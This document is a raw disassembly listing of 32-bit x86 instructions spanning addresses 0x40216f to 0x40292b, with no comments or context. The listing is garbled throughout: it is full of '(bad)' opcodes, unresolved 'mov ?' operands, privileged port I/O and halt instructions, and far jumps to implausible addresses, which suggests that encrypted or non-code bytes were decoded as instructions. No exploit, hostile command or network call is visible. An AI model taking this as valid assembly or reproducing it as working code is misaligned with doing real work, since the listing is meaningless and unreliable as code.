  40216f:	lods   eax,DWORD PTR ds:[esi]
  402170:	popf   
  402171:	scas   eax,DWORD PTR es:[edi]
  402172:	adc    eax,0x5ccae3ad
  402177:	add    ebp,DWORD PTR [esi+0x3feec5ea]
  40217d:	ret    
  40217e:	enter  0xe3e8,0x18
  402182:	xchg   ebx,eax
  402183:	mov    ebx,0xd50d5c10
  402188:	pop    eax
  402189:	(bad)  
  40218a:	jl     0x4021cb
  40218c:	sub    dl,al
  40218e:	pop    esp
  40218f:	sbb    DWORD PTR [esi],ecx
  402191:	push   ecx
  402192:	push   ebp
  402193:	std    
  402194:	inc    ecx
  402195:	or     esp,edi
  402197:	or     cl,ch
  402199:	clc    
  40219a:	jle    0x402142
  40219c:	adc    BYTE PTR [edi-0x5d],bl
  40219f:	adc    eax,0x4ab0a120
  4021a4:	dec    ebx
  4021a5:	cmc    
  4021a6:	jmp    0x6ce6dcf2
  4021ab:	push   ss
  4021ac:	aaa    
  4021ad:	and    BYTE PTR ds:0x5c4d061a,0x8c
  4021b4:	add    DWORD PTR [edx-0x78b377b6],esi
  4021ba:	cmp    al,0xeb
  4021bc:	mov    esp,0x737e86db
  4021c1:	cmp    DWORD PTR [esi],esi
  4021c3:	pop    es
  4021c4:	add    dl,bh
  4021c6:	fisttp WORD PTR [edx-0x28]
  4021c9:	sbb    DWORD PTR ds:0xa36c43cf,0xabacce7b
  4021d3:	jmp    0xc5f9925b
  4021d8:	or     al,0xa5
  4021da:	pop    edi
  4021db:	out    0x99,al
  4021dd:	pop    ds
  4021de:	dec    ebx
  4021df:	fidiv  WORD PTR [ebx]
  4021e1:	mov    ah,0xb3
  4021e3:	mov    esp,0xccd2ca1d
  4021e8:	aam    0x1b
  4021ea:	add    DWORD PTR [ebp-0x61c1ed9e],ecx
  4021f0:	dec    edi
  4021f1:	addr16 push esp
  4021f3:	js     0x4021e6
  4021f5:	push   ds
  4021f6:	pop    ebp
  4021f7:	xor    edi,DWORD PTR [edi]
  4021f9:	adc    eax,0x6e812dad
  4021fe:	cmc    
  4021ff:	pop    es
  402200:	stos   DWORD PTR es:[edi],eax
  402201:	stos   BYTE PTR es:[edi],al
  402202:	sti    
  402203:	loope  0x40218f
  402205:	add    eax,0x8a540296
  40220a:	test   al,0xf4
  40220c:	dec    edx
  40220d:	loopne 0x402284
  40220f:	push   esp
  402210:	int3   
  402211:	shl    ch,1
  402213:	sbb    ah,BYTE PTR [ecx-0xefdcacc]
  402219:	retf   0x55e0
  40221c:	test   al,0x77
  40221e:	hlt    
  40221f:	popa   
  402220:	cmp    BYTE PTR [edi-0x70],cl
  402223:	sub    edx,eax
  402225:	push   0x47ff9c5b
  40222a:	jmp    0x74ddef8c
  40222f:	sbb    edx,DWORD PTR [ecx-0x6e]
  402232:	sub    DWORD PTR [bp+di-0x69],0xe5756bed
  40223a:	fs or  al,0x8c
  40223d:	fnsave [edx+0x417f1e5f]
  402243:	lea    esp,[edi]
  402245:	dec    ecx
  402246:	inc    eax
  402247:	jb     0x402272
  402249:	jns    0x4021f7
  40224b:	push   eax
  40224c:	pop    es
  40224d:	cmp    al,0x4b
  40224f:	popf   
  402250:	pop    esi
  402251:	retf   0xbc44
  402254:	imul   eax,DWORD PTR [eax+0x3a],0x1d
  402258:	std    
  402259:	pop    es
  40225a:	sbb    BYTE PTR [eax-0x31],al
  40225d:	icebp  
  40225e:	shl    BYTE PTR [ebp-0x13],0xcc
  402262:	and    bl,bl
  402264:	add    DWORD PTR [ebp+0x3f],ebx
  402267:	mov    bl,0x8e
  402269:	(bad)  
  40226a:	stc    
  40226b:	push   eax
  40226c:	mov    bh,0xd0
  40226e:	xor    DWORD PTR [eax+eiz*2-0x5859370a],eax
  402275:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402276:	aaa    
  402277:	mov    ?,edx
  402279:	loope  0x40220c
  40227b:	push   ebx
  40227c:	aad    0x4
  40227e:	or     DWORD PTR [esi+0x12bb3cbd],ebx
  402284:	xchg   esi,eax
  402285:	jo     0x402243
  402287:	and    BYTE PTR [esi],bl
  402289:	outs   dx,BYTE PTR ds:[esi]
  40228a:	sahf   
  40228b:	ins    BYTE PTR es:[edi],dx
  40228c:	lock push 0x66c530f2
  402292:	mov    al,ds:0xaa6cbd94
  402297:	pop    esp
  402298:	hlt    
  402299:	and    BYTE PTR [ebx+0x43],al
  40229c:	out    0x54,eax
  40229e:	bound  eax,QWORD PTR [esi+0xb]
  4022a1:	add    DWORD PTR [ecx-0x228c8c96],esp
  4022a7:	fidiv  WORD PTR [esi-0x59dd6ed8]
  4022ad:	and    al,0x19
  4022af:	test   DWORD PTR [ecx],eax
  4022b1:	inc    ebx
  4022b2:	clc    
  4022b3:	mov    ebx,0xb0d6cc5f
  4022b9:	rcl    BYTE PTR [eax],1
  4022bb:	mov    dl,0x91
  4022bd:	and    DWORD PTR [edx-0xd9f3c3c],edx
  4022c3:	fdivrp st(5),st
  4022c5:	je     0x40232d
  4022c7:	add    esi,DWORD PTR [ebp+0xb]
  4022ca:	gs imul esp,DWORD PTR ss:[edi-0x49],0x119efb27
  4022d3:	cmp    al,0xa
  4022d5:	mov    ebx,0x4ac99cbb
  4022da:	mov    BYTE PTR [edi-0x35],ch
  4022dd:	loop   0x402308
  4022df:	xchg   DWORD PTR [edi+0x1e],ecx
  4022e2:	in     eax,dx
  4022e3:	pop    ds
  4022e4:	pop    esp
  4022e5:	out    dx,al
  4022e6:	rcr    BYTE PTR [eax-0xb],cl
  4022e9:	bnd jne 0x40229e
  4022ec:	and    DWORD PTR [eax+0x33],esp
  4022ef:	test   eax,0x69a2710c
  4022f4:	inc    esp
  4022f5:	jl     0x40236b
  4022f7:	cmp    ebx,esi
  4022f9:	mov    ?,WORD PTR [esi+edi*2-0x73]
  4022fd:	icebp  
  4022fe:	jae    0x40237d
  402300:	mov    edi,0x81963f38
  402305:	xchg   ebx,eax
  402306:	pop    ebp
  402307:	jbe    0x4022d9
  402309:	dec    eax
  40230a:	mov    ebp,0x18a0c20
  40230f:	dec    ebp
  402310:	outs   dx,DWORD PTR ds:[esi]
  402311:	jne    0x4022e4
  402313:	mov    eax,ds:0x4454a519
  402318:	cdq    
  402319:	scas   al,BYTE PTR es:[edi]
  40231a:	pushf  
  40231b:	imul   ecx,DWORD PTR ds:0x39f2aa01,0x7d118c60
  402325:	jno    0x4022b7
  402327:	hlt    
  402328:	sub    DWORD PTR [edx],0x6d
  40232b:	xor    bh,cl
  40232d:	or     eax,0xc33984d1
  402332:	rol    DWORD PTR [ebx-0x5a5cdb7d],1
  402338:	inc    edx
  402339:	stc    
  40233a:	xchg   esp,eax
  40233b:	push   edi
  40233c:	fisttp QWORD PTR [ecx]
  40233e:	xchg   ebx,eax
  40233f:	mov    DWORD PTR [eax+0x28],esp
  402342:	(bad)  
  402344:	lahf   
  402345:	fadd   DWORD PTR [ecx-0x13753e58]
  40234b:	push   edi
  40234c:	adc    ebx,DWORD PTR [esi-0xb]
  40234f:	adc    BYTE PTR [ebx+0x3ffe0305],ah
  402355:	pop    es
  402356:	mov    ecx,0xbbe0f4f9
  40235b:	inc    eax
  40235c:	and    DWORD PTR [edx+0x8427b65],esi
  402362:	mov    eax,0xf5ff9f1c
  402367:	pop    edx
  402368:	mov    al,ds:0xbacf8a3b
  40236d:	jp     0x402319
  40236f:	adc    dl,ah
  402371:	pop    esp
  402372:	into   
  402373:	div    BYTE PTR [ebx+0x119b2fc9]
  402379:	repnz xchg ecx,eax
  40237b:	sub    al,BYTE PTR [ebx]
  40237d:	add    DWORD PTR [esi+edi*2-0x19],ecx
  402381:	mov    eax,ds:0x7c7893b0
  402386:	ret    
  402387:	outs   dx,DWORD PTR ds:[esi]
  402388:	ja     0x4023e0
  40238a:	ficomp DWORD PTR [ebx+0x39e5ef5a]
  402390:	add    edi,DWORD PTR [ecx+0x65]
  402393:	dec    ecx
  402394:	gs add al,0x72
  402397:	mov    bl,BYTE PTR [ebx]
  402399:	out    dx,al
  40239a:	pop    eax
  40239b:	sar    DWORD PTR [edi+0x29c20091],cl
  4023a1:	jmp    0x49cb6b3b
  4023a6:	jbe    0x402344
  4023a8:	mov    cl,0xa7
  4023aa:	(bad)  
  4023ab:	js     0x40237a
  4023ad:	add    BYTE PTR [ecx-0x63],al
  4023b0:	ret    
  4023b1:	pop    edx
  4023b2:	cmp    al,BYTE PTR [ebp+0x2]
  4023b5:	stos   DWORD PTR es:[edi],eax
  4023b6:	push   ebp
  4023b7:	add    DWORD PTR [edx],edx
  4023b9:	mov    ebp,0x85b36b8b
  4023be:	add    al,0x98
  4023c0:	push   esp
  4023c1:	jg     0x40239d
  4023c3:	lock ret 
  4023c5:	mov    ecx,0x12d2d426
  4023ca:	aad    0x47
  4023cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023cd:	sub    DWORD PTR [edi+0x7],ecx
  4023d0:	(bad)  
  4023d1:	in     eax,0x54
  4023d3:	xor    BYTE PTR [esi-0x405e7a0],bl
  4023d9:	fisttp WORD PTR [eax-0x56]
  4023dd:	inc    ebx
  4023de:	jno    0x4023cf
  4023e0:	jl     0x40238d
  4023e2:	push   0x4a
  4023e4:	jge    0x402429
  4023e6:	sbb    bl,BYTE PTR [edx+0x5a4812fb]
  4023ec:	test   BYTE PTR [ecx-0x148cef4a],bh
  4023f2:	inc    esi
  4023f3:	xchg   edx,eax
  4023f4:	mov    bl,0x50
  4023f6:	xor    dh,bl
  4023f8:	pop    ds
  4023f9:	dec    ecx
  4023fa:	stos   BYTE PTR es:[edi],al
  4023fb:	push   ebp
  4023fc:	pop    es
  4023fd:	add    bh,BYTE PTR [edx+0x2a]
  402400:	out    0xc0,eax
  402402:	xchg   ebx,eax
  402403:	xchg   DWORD PTR [ecx+0xd],esp
  402406:	ja     0x4023dc
  402408:	(bad)
  40240c:	dec    ebp
  40240d:	out    0x8e,al
  40240f:	ret    0x1385
  402412:	arpl   WORD PTR [ebx+0x35],ax
  402415:	daa    
  402416:	test   ch,ah
  402418:	push   ecx
  402419:	pop    ebx
  40241a:	xor    al,0x82
  40241c:	cmc    
  40241d:	fcomp  QWORD PTR [eax-0x13]
  402420:	retf   0xac0c
  402423:	loopne 0x4023ff
  402425:	mov    eax,0x49774aa5
  40242a:	cwde   
  40242b:	xchg   ecx,eax
  40242c:	push   edx
  40242d:	cmp    eax,0xa841ceac
  402432:	mov    al,0x55
  402434:	add    DWORD PTR [ebx],ebx
  402436:	xchg   ebp,eax
  402437:	xor    DWORD PTR [ecx],0x57
  40243a:	ja     0x40246d
  40243c:	adc    dl,BYTE PTR [esi-0x6723ab1d]
  402442:	stos   DWORD PTR es:[edi],eax
  402443:	es out dx,eax
  402445:	mov    cl,0x24
  402447:	jg     0x4023de
  402449:	mov    ch,0x23
  40244b:	adc    eax,ebx
  40244d:	or     BYTE PTR [esi],al
  40244f:	fsubr  st,st(0)
  402451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402452:	dec    edx
  402453:	and    BYTE PTR [eax],bl
  402455:	push   ecx
  402456:	adc    ebp,esp
  402458:	inc    esp
  402459:	cmp    BYTE PTR [edi+0x7a],ch
  40245c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40245e:	push   cs
  40245f:	cmp    eax,0x66d2199d
  402464:	jns    0x4024ae
  402466:	loope  0x40244f
  402468:	sub    dh,BYTE PTR [eax+0x59]
  40246b:	es xchg esp,eax
  40246d:	ss out 0x86,eax
  402470:	push   ecx
  402471:	mov    ebp,0xfcf03fe8
  402476:	push   0x2c
  402478:	adc    esp,DWORD PTR [ebx+0x14]
  40247b:	dec    edi
  40247c:	aaa    
  40247d:	xor    DWORD PTR [ebx-0x32ca9e2e],edi
  402483:	out    dx,al
  402484:	add    al,0xec
  402486:	sub    cl,BYTE PTR [ebx]
  402488:	(bad)  
  402489:	adc    BYTE PTR [edx-0x635e9df6],ch
  40248f:	sbb    bl,dl
  402491:	fadd   st(3),st
  402493:	pusha  
  402494:	mov    edx,0xaca0a666
  402499:	sahf   
  40249a:	sub    al,0xf7
  40249c:	xor    BYTE PTR ds:0xbac92567,al
  4024a2:	in     al,0xa9
  4024a4:	adc    ebp,DWORD PTR [ebp+0x71]
  4024a7:	push   es
  4024a8:	ja     0x40248c
  4024aa:	(bad)  
  4024ab:	call   0xd91a64a5
  4024b0:	sti    
  4024b1:	outs   dx,DWORD PTR ds:[esi]
  4024b2:	loope  0x402462
  4024b4:	push   edi
  4024b5:	scas   al,BYTE PTR es:[edi]
  4024b6:	pop    eax
  4024b7:	mov    ah,0xf4
  4024b9:	(bad)  
  4024ba:	leave  
  4024bb:	lock popf 
  4024bd:	cmp    ebp,DWORD PTR [eax-0x10]
  4024c0:	fbld   TBYTE PTR [ecx+0x38]
  4024c3:	jp     0x4024a5
  4024c5:	adc    eax,0xfa624578
  4024ca:	cld    
  4024cb:	jle    0x402465
  4024cd:	shl    DWORD PTR [ebx+0x10],0x60
  4024d1:	cmp    al,0x7e
  4024d3:	ja     0x402521
  4024d5:	push   edx
  4024d6:	aaa    
  4024d7:	popf   
  4024d8:	mov    ds:0xc3599535,al
  4024dd:	lods   al,BYTE PTR ds:[esi]
  4024de:	xor    BYTE PTR [esi+0x55],ch
  4024e1:	cli    
  4024e2:	(bad)  
  4024e3:	retf   
  4024e4:	lock mov ch,0x95
  4024e7:	xchg   esi,eax
  4024e8:	jle    0x40249e
  4024ea:	jmp    0xfd07:0x69ba8816
  4024f1:	lods   eax,DWORD PTR ds:[esi]
  4024f2:	bound  eax,QWORD PTR [ecx]
  4024f4:	and    ecx,DWORD PTR [ebx+0x3e]
  4024f7:	dec    ebp
  4024f8:	jb     0x40254a
  4024fa:	sub    BYTE PTR [edx-0xd9e916f],0x82
  402501:	and    BYTE PTR [edx-0x36],ah
  402504:	xor    eax,ebp
  402506:	xchg   edx,eax
  402507:	lea    edx,[edi-0x11]
  40250a:	mov    edx,0x7102ebbc
  40250f:	jmp    0x40252a
  402511:	shr    BYTE PTR gs:[esi],0xf9
  402515:	les    ebx,FWORD PTR [esi-0x15a8c7c4]
  40251b:	or     ch,dh
  40251d:	or     BYTE PTR [ebx-0x79a813f3],dl
  402523:	pop    ds
  402524:	jo     0x402556
  402526:	emms   
  402528:	lea    ebx,[edi-0x37341ed7]
  40252e:	sbb    esp,DWORD PTR [ebp-0x48]
  402531:	inc    ecx
  402532:	(bad)  
  402533:	lock (bad) 
  402535:	repnz inc edx
  402537:	stc    
  402538:	iret   
  402539:	jecxz  0x4024bd
  40253b:	jne    0x40250b
  40253d:	popa   
  40253e:	dec    esi
  40253f:	add    ch,BYTE PTR [edi+ebp*1]
  402542:	or     BYTE PTR [eax],cl
  402544:	adc    ebx,DWORD PTR [esi-0x7f4e69e2]
  40254a:	push   esp
  40254b:	in     eax,dx
  40254c:	sti    
  40254d:	mov    edx,0xecdc04bf
  402552:	and    al,0xaf
  402554:	pop    ecx
  402555:	xchg   ebx,eax
  402556:	fld    DWORD PTR [esi+0x6e009cf4]
  40255c:	in     al,0x80
  40255e:	xchg   DWORD PTR [ecx],ebx
  402560:	pop    ecx
  402561:	mul    DWORD PTR [esi-0x4d]
  402564:	push   esi
  402565:	not    BYTE PTR [edi+ebp*4+0x40]
  402569:	inc    esp
  40256a:	sbb    eax,eax
  40256c:	aaa    
  40256d:	sub    BYTE PTR [eax+0x5001fea9],cl
  402573:	lods   al,BYTE PTR ds:[esi]
  402574:	mov    ecx,0x5e6091
  402579:	push   ebx
  40257a:	mov    DWORD PTR [eax-0x15],edx
  40257d:	sbb    DWORD PTR [ecx-0x51d5ef57],ebp
  402583:	int    0x5d
  402585:	mov    al,ds:0x3250330e
  40258a:	and    BYTE PTR [ecx+0x2d],ah
  40258d:	fisubr WORD PTR [edx+0x6801343d]
  402593:	out    0x65,al
  402595:	cwde   
  402596:	xchg   edx,eax
  402597:	cmp    al,0x4
  402599:	jle    0x4025c9
  40259b:	sbb    ah,BYTE PTR [esi]
  40259d:	stos   BYTE PTR es:[edi],al
  40259e:	jne    0x402542
  4025a0:	out    dx,eax
  4025a1:	test   al,0xf8
  4025a3:	or     al,0xd4
  4025a5:	out    0x5d,eax
  4025a7:	add    al,0x58
  4025a9:	test   DWORD PTR [edx+0x26d5f12d],0xc1e54cc1
  4025b3:	mov    ds:0x7fe1024c,eax
  4025b8:	inc    ecx
  4025b9:	cmp    esp,DWORD PTR [eax-0xb006b13]
  4025bf:	(bad)  
  4025c0:	cmp    eax,0x4db48ac8
  4025c5:	and    al,BYTE PTR [edi+0x77]
  4025c8:	int    0x2b
  4025ca:	leave  
  4025cb:	sub    dh,dh
  4025cd:	add    BYTE PTR [esi],bl
  4025cf:	mov    ebx,0x51522cb4
  4025d4:	cmp    ebp,DWORD PTR [ebx+0x6]
  4025d7:	rcl    bl,0x16
  4025da:	jle    0x40263c
  4025dc:	ins    BYTE PTR es:[edi],dx
  4025dd:	mov    BYTE PTR ds:0x7f032a01,0x2e
  4025e4:	js     0x402605
  4025e6:	cmp    eax,0x6fe6ffac
  4025eb:	cld    
  4025ec:	pushf  
  4025ed:	pop    ecx
  4025ee:	ins    BYTE PTR es:[edi],dx
  4025ef:	mov    ds:0xd867af85,eax
  4025f4:	fst    QWORD PTR [edx*8-0x66c2113]
  4025fb:	mov    dl,0x48
  4025fd:	pop    ecx
  4025fe:	fnstenv [eax+0x270d21c7]
  402604:	pushf  
  402605:	sbb    ecx,DWORD PTR [ecx+0xf5ee654]
  40260b:	outs   dx,DWORD PTR ds:[esi]
  40260c:	test   al,0x24
  40260e:	xor    DWORD PTR [ebx-0x42],0xffffffc2
  402612:	(bad)  
  402613:	xor    esp,edi
  402615:	jg     0x4025c4
  402617:	xrelease xchg DWORD PTR [edi+0x6cc4ce4d],ecx
  40261e:	xor    al,0x8d
  402620:	xor    al,0xc1
  402622:	scas   eax,DWORD PTR es:[edi]
  402623:	add    bl,BYTE PTR [ebp-0x43808b70]
  402629:	mov    cl,0x9d
  40262b:	adc    DWORD PTR [edx-0x24db0110],eax
  402631:	ja     0x402658
  402633:	adc    esi,0x7c8494e2
  402639:	lahf   
  40263a:	xor    eax,0xa982ddf2
  40263f:	imul   esp,DWORD PTR [ebx-0x2470e9ea],0xdb979981
  402649:	imul   edx,DWORD PTR [ebx],0xe437c70a
  40264f:	jbe    0x4025da
  402651:	fld    QWORD PTR [esi+0x403df642]
  402657:	arpl   WORD PTR [ebx-0x33],bp
  40265a:	popa   
  40265b:	enter  0x6d02,0x9f
  40265f:	inc    ebx
  402660:	push   ds
  402661:	int    0x2a
  402663:	pop    es
  402664:	ret    
  402665:	pop    es
  402666:	xchg   edx,eax
  402667:	test   BYTE PTR [edi-0x6bae57fe],dh
  40266d:	int3   
  40266e:	jo     0x4026ee
  402670:	sub    cl,dh
  402672:	in     eax,0x4d
  402674:	mov    DWORD PTR [ecx-0x16419471],ebp
  40267a:	mov    eax,0xc25e1c38
  40267f:	in     al,dx
  402680:	mov    ebx,0x5139f705
  402685:	mov    ds:0xdaaf1f41,eax
  40268a:	adc    ebx,DWORD PTR [esi]
  40268c:	xchg   ebx,eax
  40268d:	and    DWORD PTR [ebx+0x5a],ebp
  402690:	push   ebx
  402691:	inc    esi
  402692:	jbe    0x40268f
  402694:	test   al,0xe5
  402696:	mov    ss,WORD PTR [eax+0xbb840e]
  40269c:	sub    DWORD PTR [eax-0x7b173231],ebx
  4026a2:	jbe    0x40263c
  4026a4:	push   es
  4026a5:	lds    ebx,FWORD PTR [esi]
  4026a7:	out    dx,eax
  4026a8:	fadd   QWORD PTR [edx]
  4026aa:	inc    esi
  4026ab:	mov    dl,0x8e
  4026ad:	xchg   ebx,eax
  4026ae:	aad    0x33
  4026b0:	(bad)  [eax+eiz*1]
  4026b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026b4:	sbb    al,0xb6
  4026b6:	jo     0x402709
  4026b8:	aaa    
  4026b9:	pop    esi
  4026ba:	inc    ecx
  4026bb:	and    cl,ah
  4026bd:	mov    ebp,0xc1fadd2
  4026c2:	pop    ss
  4026c3:	sbb    DWORD PTR [ebp+0x45],ebx
  4026c6:	shl    DWORD PTR [edx+0x61],cl
  4026c9:	xchg   ebx,eax
  4026ca:	jae    0x402666
  4026cc:	push   0x11d84ae1
  4026d1:	jns    0x4026b3
  4026d3:	popa   
  4026d4:	(bad)  
  4026d6:	xchg   ecx,eax
  4026d7:	cmc    
  4026d8:	scas   al,BYTE PTR es:[edi]
  4026d9:	sahf   
  4026da:	pop    ecx
  4026db:	mov    dh,0x80
  4026dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026de:	scas   al,BYTE PTR es:[edi]
  4026df:	pop    esp
  4026e0:	out    dx,al
  4026e1:	pop    ds
  4026e2:	pop    eax
  4026e3:	out    0x37,eax
  4026e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e6:	jmp    0x73f8:0x84becbf
  4026ed:	dec    esp
  4026ee:	sbb    DWORD PTR [edx],eax
  4026f0:	das    
  4026f1:	cmp    BYTE PTR [edx+0x4],al
  4026f4:	xor    DWORD PTR [edi-0x1ffd3880],ebx
  4026fa:	xchg   ebp,eax
  4026fb:	hlt    
  4026fc:	dec    ebx
  4026fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026fe:	sti    
  4026ff:	sbb    edx,ecx
  402701:	pop    es
  402702:	jmp    0x6404eb9d
  402707:	lods   eax,DWORD PTR ds:[esi]
  402708:	pop    edx
  402709:	mov    WORD PTR [edx+0x44b3a48],gs
  40270f:	mov    eax,ds:0x2c2f4e3e
  402714:	call   0xddffcdb
  402719:	cmp    al,0x1
  40271b:	adc    ch,BYTE PTR [ebx-0x13451abb]
  402721:	(bad)  
  402722:	leave  
  402723:	ja     0x4026b2
  402725:	add    DWORD PTR [ebx+ecx*2],ebx
  402728:	test   BYTE PTR [ebx-0x6b],ah
  40272b:	xchg   edx,eax
  40272c:	or     al,0xd0
  40272e:	clc    
  40272f:	cli    
  402730:	lahf   
  402731:	xor    al,0x71
  402733:	xchg   ebx,eax
  402734:	iret   
  402735:	and    ebx,eax
  402737:	pop    ecx
  402738:	fcom   st(0)
  40273a:	repnz push cs
  40273c:	jg     0x4026dc
  40273e:	mov    WORD PTR [edi],es
  402740:	sbb    al,0xa4
  402742:	pop    ds
  402743:	popa   
  402744:	icebp  
  402745:	pop    esi
  402746:	leave  
  402747:	adc    eax,0xacfda5bf
  40274c:	jge    0x40275d
  40274e:	xchg   edi,eax
  40274f:	mov    ss,WORD PTR [ecx]
  402751:	push   esi
  402752:	inc    edi
  402753:	jnp    0x4027d3
  402755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402756:	je     0x4027c2
  402758:	jmp    FWORD PTR [esi-0x42]
  40275b:	in     eax,dx
  40275c:	pop    edi
  40275d:	and    al,0xc3
  40275f:	mov    al,al
  402761:	xchg   ecx,eax
  402762:	cwde   
  402763:	add    ch,bh
  402765:	pushf  
  402766:	pop    ebp
  402767:	sahf   
  402768:	es jne 0x4027c6
  40276b:	cmc    
  40276c:	fmul   st,st(0)
  40276e:	jb     0x402701
  402770:	mov    esp,0x318bb089
  402775:	inc    edi
  402776:	jns    0x4026f9
  402778:	pop    ss
  402779:	sbb    DWORD PTR [edx+0x5d],0x6bffd08d
  402780:	sub    BYTE PTR [ebx+0x1ca1b389],0x45
  402787:	adc    BYTE PTR [esi+0x79],bl
  40278a:	lock xchg esp,eax
  40278c:	aad    0xdd
  40278e:	mov    ebp,0xbfb23506
  402793:	mov    ds:0x1bb0ab0e,eax
  402798:	(bad)  [ebx]
  40279a:	sbb    eax,0xda17083c
  40279f:	dec    esp
  4027a0:	stc    
  4027a1:	(bad)  
  4027a2:	push   ss
  4027a3:	stos   BYTE PTR es:[edi],al
  4027a4:	lods   al,BYTE PTR ds:[esi]
  4027a5:	fild   WORD PTR [ebp+eiz*2-0x8]
  4027a9:	hlt    
  4027aa:	imul   ebp,DWORD PTR [ecx-0x1e50cc62],0x72d5bc5a
  4027b4:	rcr    DWORD PTR [ebp+0x633db323],cl
  4027ba:	out    dx,al
  4027bb:	in     al,dx
  4027bc:	cdq    
  4027bd:	lock (bad) 
  4027c0:	aad    0x48
  4027c2:	out    dx,eax
  4027c3:	sbb    eax,0x46b984a3
  4027c8:	rcl    DWORD PTR [ebx+0x198f8243],0xdc
  4027cf:	or     DWORD PTR [edi-0x74a2a18d],edx
  4027d5:	push   ecx
  4027d6:	adc    bh,BYTE PTR [eax-0x3df77af3]
  4027dc:	cld    
  4027dd:	or     ah,BYTE PTR [ecx+ebx*1-0x4bf353c3]
  4027e4:	cvtps2pi mm4,xmm7
  4027e7:	dec    ecx
  4027e8:	sub    bh,cl
  4027ea:	xor    esp,DWORD PTR [edx+ecx*8+0x4280280c]
  4027f1:	push   ecx
  4027f2:	jl     0x40279a
  4027f4:	mov    dh,BYTE PTR [ebp+0x3f22dce]
  4027fa:	jbe    0x402817
  4027fc:	lds    ecx,FWORD PTR [edx]
  4027fe:	ins    DWORD PTR es:[edi],dx
  4027ff:	inc    ecx
  402800:	hlt    
  402801:	jns    0x4027dc
  402803:	outs   dx,DWORD PTR ds:[esi]
  402804:	sbb    eax,0xc56894c
  402809:	punpcklbw mm0,DWORD PTR [ebx-0x23]
  40280d:	add    al,0x86
  40280f:	ret    
  402810:	push   eax
  402811:	sti    
  402812:	ins    BYTE PTR es:[edi],dx
  402813:	data16 adc al,0xa5
  402816:	sub    BYTE PTR [esp+ebp*2-0x39],ah
  40281a:	pop    esp
  40281b:	mov    al,0x2e
  40281d:	int    0xd4
  40281f:	ret    0xdf51
  402822:	es inc esp
  402824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402825:	aad    0x1a
  402827:	test   BYTE PTR [ecx],ah
  402829:	sub    ebp,edi
  40282b:	lock (bad) 
  40282d:	mov    bl,BYTE PTR [esi]
  40282f:	cmp    cl,al
  402831:	daa    
  402832:	pop    ss
  402833:	sub    al,0xe9
  402835:	mov    WORD PTR [ebp-0x7819b453],es
  40283b:	sub    ecx,DWORD PTR [ecx-0x29b0980]
  402841:	jle    0x40285a
  402843:	imul   ecx,eax,0xbe8d1129
  402849:	fisubr WORD PTR [ebp*4+0x408e6c1e]
  402850:	(bad)  
  402851:	mov    eax,0x94e41e18
  402856:	adc    dh,BYTE PTR [eax]
  402858:	pop    edi
  402859:	idiv   DWORD PTR [ecx]
  40285b:	push   ss
  40285c:	xchg   ebx,eax
  40285d:	push   ss
  40285e:	and    bh,BYTE PTR [edi+0x76744121]
  402864:	or     esp,ebp
  402866:	adc    al,0x4c
  402868:	inc    esi
  402869:	test   eax,0xe086e67
  40286f:	sub    eax,0x5871fbc4
  402874:	pusha  
  402875:	push   ebx
  402876:	lock inc BYTE PTR [ecx+ebx*1]
  40287a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40287b:	jge    0x40280d
  40287d:	add    al,0x7a
  40287f:	pop    ebx
  402880:	adc    eax,0xbb9f46d7
  402885:	xchg   DWORD PTR [ecx-0x8],edi
  402888:	cli    
  402889:	dec    esi
  40288a:	fdiv   DWORD PTR ds:0xa9ce172f
  402890:	mov    dh,0x36
  402892:	jg     0x40285d
  402894:	arpl   di,bx
  402896:	adc    cl,dh
  402898:	std    
  402899:	pusha  
  40289a:	sub    DWORD PTR [edi+edx*1+0x7c],0x3e
  40289f:	sbb    esp,esp
  4028a1:	dec    ecx
  4028a2:	push   ebp
  4028a3:	add    DWORD PTR [esi+ebp*1+0x61c3280d],edi
  4028aa:	out    0x15,al
  4028ac:	aas    
  4028ad:	jnp    0x4028af
  4028af:	ja     0x40283a
  4028b1:	cdq    
  4028b2:	mov    ecx,fs
  4028b4:	daa    
  4028b5:	adc    DWORD PTR [ebp-0x20],ebx
  4028b8:	enter  0xacca,0x7a
  4028bc:	mov    eax,ds:0xa7b7af22
  4028c1:	fbstp  TBYTE PTR [ebp+0x6]
  4028c4:	sti    
  4028c5:	cmc    
  4028c6:	bound  esi,QWORD PTR [esp+eiz*4+0x4f]
  4028ca:	jg     0x4028d1
  4028cc:	or     DWORD PTR [eax],ecx
  4028ce:	inc    esp
  4028cf:	pushf  
  4028d0:	dec    edi
  4028d1:	sub    DWORD PTR [edx-0x73],esp
  4028d4:	jae    0x40292d
  4028d6:	xchg   DWORD PTR ds:0xa34756e,ebx
  4028dc:	adc    edx,DWORD PTR [eax+0x49]
  4028df:	in     al,dx
  4028e0:	jmp    0x4028ae
  4028e2:	push   esp
  4028e3:	xor    al,0xb9
  4028e5:	inc    esi
  4028e6:	sar    BYTE PTR [edi],0x5c
  4028e9:	xchg   ebp,eax
  4028ea:	and    eax,0x61dc2250
  4028ef:	push   ebp
  4028f0:	or     dl,dh
  4028f2:	xor    DWORD PTR [edi],eax
  4028f4:	jns    0x402918
  4028f6:	or     al,0xa1
  4028f8:	xor    BYTE PTR [ecx+0x7b],0x98
  4028fc:	or     eax,0xc78e120f
  402901:	stos   BYTE PTR es:[edi],al
  402902:	add    DWORD PTR [edx-0x62],0x1a1468fe
  402909:	adc    ch,BYTE PTR [edx+0x3b]
  40290c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40290d:	inc    ecx
  40290e:	ja     0x4028c2
  402910:	in     eax,dx
  402911:	adc    al,BYTE PTR [ebp-0x60]
  402914:	push   0xe48307de
  402919:	pop    ecx
  40291a:	addr16 out dx,eax
  40291c:	retf   
  40291d:	push   eax
  40291e:	or     BYTE PTR [ebx+0x6d82f39d],bl
  402924:	in     eax,0xc8
  402926:	or     DWORD PTR [edi+0x3f],esi
  402929:	sbb    DWORD PTR [ecx],ebx
  40292b:	iret   
